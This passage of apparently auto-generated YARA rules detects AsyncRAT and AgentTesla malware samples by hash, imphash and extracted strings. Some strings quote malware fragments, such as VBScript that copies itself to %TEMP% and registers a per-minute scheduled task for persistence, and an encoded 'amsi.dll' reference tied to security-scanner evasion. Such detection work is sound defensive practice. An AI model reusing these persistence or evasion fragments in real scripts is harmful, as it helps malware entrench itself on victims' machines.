      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_19c6a84c.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b5a517e6.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c1129d12.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "19c6a84c8200c16cac045f000ae108fb90940fddc71bf836fe0bc225300dba58"
      hash2 = "b5a517e674d611f304c6f3ab0ab7c8e4b26a34df34bfcefdb0abb5cdabc6f37e"
      hash3 = "c1129d126820d0b83ec14389944fd8a7ade95e6a980245d37b904623183ddbf1"
   strings:
      $s1 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>" fullword ascii /* score: '17.00'*/
      $s2 = "AntiProcess" fullword ascii /* score: '15.00'*/
      $s3 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
      $s4 = "UmVjZWl2ZWQ=" fullword wide /* base64 encoded string 'Received' */ /* score: '14.00'*/
      $s5 = "  <assemblyIdentity version=\"1.0.7.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s6 = "YW1zaS5kbGw=" fullword wide /* base64 encoded string 'amsi.dll' */ /* score: '11.00'*/
      $s7 = "<GetFiltes>b__0" fullword ascii /* score: '9.00'*/
      $s8 = "get_ActivatePo_ng" fullword ascii /* score: '9.00'*/
      $s9 = "GetFiltes" fullword ascii /* score: '9.00'*/
      $s10 = "mscfile" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5c65f_imphash__AgentTesla_signat_98 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash3 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash4 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash5 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash6 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash7 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash8 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash9 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash10 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s2 = "IKeyedItem`1\"ConcurrentQueue`1" fullword ascii /* score: '12.00'*/
      $s3 = "GetInt16Config" fullword ascii /* score: '12.00'*/
      $s4 = "Stream length must be non-negative and less than 2^31 - 1 - origin" fullword wide /* score: '12.00'*/
      $s5 = ".NET Long Running Tas" fullword wide /* score: '10.00'*/
      $s6 = "System.Threading.ThreadPool.UseWindowsThreadPoo" fullword wide /* score: '10.00'*/
      $s7 = "There are too many threads currently waiting on the event. A maximum of {0} waiting threads are supported" fullword wide /* score: '10.00'*/
      $s8 = "get_Exception@" fullword ascii /* score: '9.00'*/
      $s9 = "\"InternalQueueTask&get_InternalCurrent" fullword ascii /* score: '9.00'*/
      $s10 = "&TryGetValueInternal" fullword ascii /* score: '9.00'*/
      $s11 = "The timeout must be a value between -1 and Int32.MaxValue, inclusive" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__25e306_99 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
   strings:
      $s1 = "RTryGetConstructedGenericTypeForComponentsRTryLookupFunctionPointerTypeForComponents@" fullword ascii /* score: '15.00'*/
      $s2 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType" fullword ascii /* score: '14.00'*/
      $s3 = "get_Target$AddrOfPinnedObject" fullword ascii /* score: '14.00'*/
      $s4 = "6get_IsArrayOfReferenceTypes:TryGetGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s5 = "2FunctionPointersToOffsetstTryGetConstructedGenericTypeForComponentsNoConstraintCheck@" fullword ascii /* score: '12.00'*/
      $s6 = "IsValueTypeImpl<get_InternalRuntimeElementType@" fullword ascii /* score: '12.00'*/
      $s7 = "`ReflectionExecutionDomainCallbacksImplementation" fullword ascii /* score: '12.00'*/
      $s8 = "@get_RuntimeGenericTypeParameters>get_TypeRefDefOrSpecForBaseType@" fullword ascii /* score: '12.00'*/
      $s9 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheck" fullword ascii /* score: '12.00'*/
      $s10 = "GetTypeCodeImpl@" fullword ascii /* score: '9.00'*/
      $s11 = "IsPointerImpl8get_IsConstructedGenericType,get_IsGenericParameter" fullword ascii /* score: '9.00'*/
      $s12 = "B<CoreGetDeclaredNestedTypes>d__60" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsGCPointer$get_UnderlyingType0get_HasStaticConstructor" fullword ascii /* score: '9.00'*/
      $s14 = "\"get_DeclaringType" fullword ascii /* score: '9.00'*/
      $s15 = "get_CurrentInfoN<GetInstance>g__GetProviderNonNull|58_0" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__57a57b_100 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
   strings:
      $s1 = "TElementFReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s2 = "ModuleFixupCell&SECURITY_ATTRIBUTES PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s3 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s4 = "\"get_ComponentSize" fullword ascii /* score: '12.00'*/
      $s5 = "4$EventLogPermission0EventLogPermissionAccess6EventLogPermissionAttribute.EventLogPermissionEntryBEventLogPermissionEntryCollect" ascii /* score: '12.00'*/
      $s6 = "StorePermission0StorePermissionAttribute(StorePermissionFlags0TypeDescriptorPermissionBTypeDescriptorPermissionAttribute:TypeDes" ascii /* score: '10.00'*/
      $s7 = "$get_CurrentCulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s8 = "4$EventLogPermission0EventLogPermissionAccess6EventLogPermissionAttribute.EventLogPermissionEntryBEventLogPermissionEntryCollect" ascii /* score: '9.00'*/
      $s9 = "4GenericEmptyEnumeratorBase0GenericEmptyEnumerator`14ArrayTypeMismatchException.BadImageFormatException.DataMisalignedException" fullword ascii /* score: '8.00'*/
      $s10 = "tNThrowArgumentOutOfRange_BadYearMonthDayTGetAddingDuplicateWithKeyArgumentException" fullword ascii /* score: '8.00'*/
      $s11 = "ThrowStartIndexArgumentOutOfRange_ArgumentOutOfRange_IndexMustBeLessOrEqualjThrowCountArgumentOutOfRange_ArgumentOutOfRange_Coun" ascii /* score: '8.00'*/
      $s12 = "(InvalidCastException2InvalidOperationException.InvalidProgramException*MethodAccessException*MissingFieldException,MissingMembe" ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__877ce367_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_101 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_877ce367.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7369f1ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "877ce367ca9c8219fec30540624b7ffe9a57123d91d8346bd30d050a19afafb4"
      hash2 = "7369f1ecdd1305ca16ce7bf837f0fff74acde94cb2fa2a5b3dc9500c061f6077"
   strings:
      $s1 = "SELECT * FROM tbl_users WHERE username= '" fullword wide /* score: '16.00'*/
      $s2 = "Back to LOGIN" fullword wide /* score: '15.00'*/
      $s3 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=db_users.mdb" fullword wide /* score: '15.00'*/
      $s4 = "frmLogin" fullword wide /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties.Resources" fullword wide /* score: '15.00'*/
      $s6 = "Login_And_Register_Form" fullword wide /* score: '15.00'*/
      $s7 = "Username and Password fields are empty" fullword wide /* score: '12.00'*/
      $s8 = "INSERT INTO tbl_users VALUES ('" fullword wide /* score: '12.00'*/
      $s9 = "Passwords does not match, please re-enter the password" fullword wide /* score: '12.00'*/
      $s10 = "chckbxPassword" fullword wide /* score: '12.00'*/
      $s11 = "' and password= '" fullword wide /* score: '12.00'*/
      $s12 = "Invalid username or password, please try again" fullword wide /* score: '12.00'*/
      $s13 = "Already Have An Account" fullword wide /* score: '10.00'*/
      $s14 = "Get Started" fullword wide /* score: '9.00'*/
      $s15 = "btnequal" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signat_102 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash5 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "\"MethodBaseInvoker(ExecutionEnvironment" fullword ascii /* score: '20.00'*/
      $s2 = "RTryGetConstructedGenericTypeForComponentstTryGetConstructedGenericTypeForComponentsNoConstraintCheck&TryGetMethodInvoker@" fullword ascii /* score: '16.00'*/
      $s3 = "z<GetRuntimeTypeInfo>g__GetConstructedGenericTypeForHandle|2_0t<GetRuntimeTypeInfo>g__GetFunctionPointerTypeForHandle|2_1 GetMet" ascii /* score: '16.00'*/
      $s4 = ".<ExecuteCallback>b__9_0" fullword ascii /* score: '14.00'*/
      $s5 = "(ThrowTargetException" fullword ascii /* score: '14.00'*/
      $s6 = "Object type {0} does not match target type {1}" fullword wide /* score: '14.00'*/
      $s7 = "&MakeHRFromErrorCode<ThrowInvalidOperationException" fullword ascii /* score: '12.00'*/
      $s8 = "GetData2<get_ComputerName>b__10_0B<GetPerformanceCounterLib>b__14_0@" fullword ascii /* score: '12.00'*/
      $s9 = "ParameterHandle.PropertySignatureHandle&TypeForwarderHandle@TypeInstantiationSignatureHandle\"QMethodDefinition" fullword ascii /* score: '12.00'*/
      $s10 = "LGetRuntimeTypeInfoForRuntimeTypeHandle" fullword ascii /* score: '12.00'*/
      $s11 = "*GetNamedTypeForHandle$GetRuntimeTypeInfo" fullword ascii /* score: '12.00'*/
      $s12 = "8get_MetadataDefinitionMethod*get_RuntimeParameters@" fullword ascii /* score: '12.00'*/
      $s13 = "z<GetRuntimeTypeInfo>g__GetConstructedGenericTypeForHandle|2_0t<GetRuntimeTypeInfo>g__GetFunctionPointerTypeForHandle|2_1 GetMet" ascii /* score: '12.00'*/
      $s14 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
      $s15 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__AsyncRAT_signature__3e6bdc1b_AsyncRAT_signature__4298a440_AsyncRAT_signature__4a3b8ecf_AsyncRAT_signatu_103 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature).vbs, AsyncRAT(signature)_3e6bdc1b.vbs, AsyncRAT(signature)_4298a440.vbs, AsyncRAT(signature)_4a3b8ecf.vbs, AsyncRAT(signature)_7c0c2ca1.vbs, AsyncRAT(signature)_950a872a.vbs, AsyncRAT(signature)_9f6c6c00.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "60a94a76917e2a6fab05c4208798153fba040561669c6b71377f6d6893715d97"
      hash2 = "3e6bdc1b04ee6d931d0d5e5375cec5be704c3952e6de5950f52410c5586e78ee"
      hash3 = "4298a440b5c36d8760418114e3278378b167b8d09267640ffda81f082041789d"
      hash4 = "4a3b8ecf4ad2fb359346c0c4b6be203c3b9ba719a318786be71ba75da0228e87"
      hash5 = "7c0c2ca1538238830d42e0df6889189c3c57960b6f5f8f349c4fa5232303d85e"
      hash6 = "950a872a54fdcc104d9c22ae8510b0e4c3ee0b9a53c8c03c11c8f3dc852686e1"
      hash7 = "9f6c6c005705434d72714a57943920fc7c90c5e842c0d2adfe3c6d28e8635d13"
   strings:
      $s1 = "Higienico.Run ococomat, 0, True" fullword wide /* score: '16.00'*/
      $s2 = "TnOj = Higienico.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s3 = "Holoroso = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s4 = "ococomat = \"schtasks /create /tn \" & LLJZ & \" /tr \"\"\" & Tizas & \"\"\" /sc minute /mo 1\"" fullword wide /* score: '14.00'*/
      $s5 = "Higienico.Run Holoroso, 0, True" fullword wide /* score: '13.00'*/
      $s6 = "Set Higienico = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s7 = "Holoroso = \"schtasks /delete /tn \" & LLJZ & \" /f\"" fullword wide /* score: '11.00'*/
      $s8 = "Tizas = TnOj & \"\\GLPd.vbs\"" fullword wide /* score: '11.00'*/
      $s9 = "' Tenta copiar o arquivo para a pasta tempor" fullword wide /* score: '11.00'*/
      $s10 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s11 = "ria: \" & Err.Description" fullword wide /* score: '10.00'*/
      $s12 = "CacaPooolsdf = WScript.ScriptFullName" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0xfeff and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5c65f_imphash__AgentTesla_signat_104 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash3 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash4 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash5 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash6 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash7 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash8 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash9 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "GetOSVersion&get_SystemDirectory4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '15.00'*/
      $s2 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s3 = "XGetArraySegmentCtorValidationFailedException" fullword ascii /* score: '12.00'*/
      $s4 = ".SystemTimeProviderTimer$SystemTimeProvider" fullword ascii /* score: '11.00'*/
      $s5 = "&FinishContinuations RunContinuations4RunOrQueueCompletionAction@" fullword ascii /* score: '10.00'*/
      $s6 = "&GetEnumerableSorter@" fullword ascii /* score: '9.00'*/
      $s7 = "$RhGetGcTotalMemory\"RhStartNoGCRegion" fullword ascii /* score: '9.00'*/
      $s8 = "get_TickCount64" fullword ascii /* score: '9.00'*/
      $s9 = "OSVersion's call to GetVersionEx failed" fullword wide /* score: '8.00'*/
      $s10 = "platfor" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( all of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5c65f_imphash__AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imph_105 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash2 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
   strings:
      $s1 = "IRootDesignerJSystem.Diagnostics.PerformanceCounter6System.Diagnostics.EventLog6System.Security.Permissions$ShellExecuteHelper" fullword ascii /* score: '26.00'*/
      $s2 = "(ShellExecuteFunction\"waitHandleContext" fullword ascii /* score: '18.00'*/
      $s3 = ".ShellExecuteOnSTAThread" fullword ascii /* score: '18.00'*/
      $s4 = "/&ReflectionExecution'" fullword ascii /* score: '16.00'*/
      $s5 = "$ProcessWindowStyle" fullword ascii /* score: '15.00'*/
      $s6 = " ProcessStartInfo" fullword ascii /* score: '15.00'*/
      $s7 = ",GetHRForLastWin32Error4ZeroFreeGlobalAllocUnicode" fullword ascii /* score: '12.00'*/
      $s8 = "4GetFileAttributesExPrivate" fullword ascii /* score: '12.00'*/
      $s9 = "0ExecutionContextCallback" fullword ascii /* score: '12.00'*/
      $s10 = "TryDequeue,NotifyWorkItemProgress@" fullword ascii /* score: '11.00'*/
      $s11 = "(<GetEnumerator>d__19" fullword ascii /* score: '9.00'*/
      $s12 = "FreeLibrary&GetCurrentDirectory" fullword ascii /* score: '9.00'*/
      $s13 = "2WriteSyncUsingAsyncHandleBGetNativeOverlappedForAsyncHandle" fullword ascii /* score: '9.00'*/
      $s14 = "$get_MoveNextAction@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5c65f_imphash__AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imph_106 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash2 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash3 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash4 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash5 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "The Process object must have the UseShellExecute property set to false in order to start a process as a user" fullword wide /* score: '29.00'*/
      $s2 = "The Process object must have the UseShellExecute property set to false in order to redirect IO streams" fullword wide /* score: '26.00'*/
      $s3 = "The Process object must have the UseShellExecute property set to false in order to use environment variables" fullword wide /* score: '26.00'*/
      $s4 = ".StartWithShellExecuteEx8GetShowWindowFromWindowStyle" fullword ascii /* score: '23.00'*/
      $s5 = "ProcessStartInfo.LoadUserProfile and ProcessStartInfo.UseCredentialsForNetworkingOnly cannot both be set. Use only one of them" fullword wide /* score: '22.00'*/
      $s6 = "UseShellExecute is not supported on this platform" fullword wide /* score: '21.00'*/
      $s7 = " GetProcessHandle@" fullword ascii /* score: '20.00'*/
      $s8 = "TOKEN_PRIVILEGE SHELLEXECUTEINFO" fullword ascii /* score: '20.00'*/
      $s9 = "T<CreateProcessWithLogonW>g____PInvoke|10_0" fullword ascii /* score: '18.00'*/
      $s10 = ".CreateProcessWithLogonW" fullword ascii /* score: '18.00'*/
      $s11 = "D<ShellExecuteExW>g____PInvoke|19_0" fullword ascii /* score: '18.00'*/
      $s12 = ".NET Process ST" fullword wide /* score: '18.00'*/
      $s13 = "An error occurred trying to start process '{0}' with working directory '{1}'. {2" fullword wide /* score: '18.00'*/
      $s14 = "GetShellError" fullword ascii /* score: '17.00'*/
      $s15 = "ProcessStartInfo.Password and ProcessStartInfo.PasswordInClearText cannot both be set. Use only one of them" fullword wide /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signat_107 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash3 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash4 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash5 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash6 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash7 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash8 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash9 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash10 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash11 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash12 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash13 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<System.Reflection.ConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Reflection.FieldInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s5 = "Zget_RuntimeMethodCommonOfUninstantiatedMethod@" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Reflection.FieldInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s7 = "get_Reader@" fullword ascii /* score: '12.00'*/
      $s8 = "IsSystemArrayZHasExplicitOrImplicitPublicDefaultConstructorTNormalizedPrimitiveTypeSizeForIntegerTypes" fullword ascii /* score: '10.00'*/
      $s9 = "jget_TypeRefDefOrSpecsForDirectlyImplementedInterfaces@" fullword ascii /* score: '9.00'*/
      $s10 = ">get_TypeRefDefOrSpecForBaseType@" fullword ascii /* score: '9.00'*/
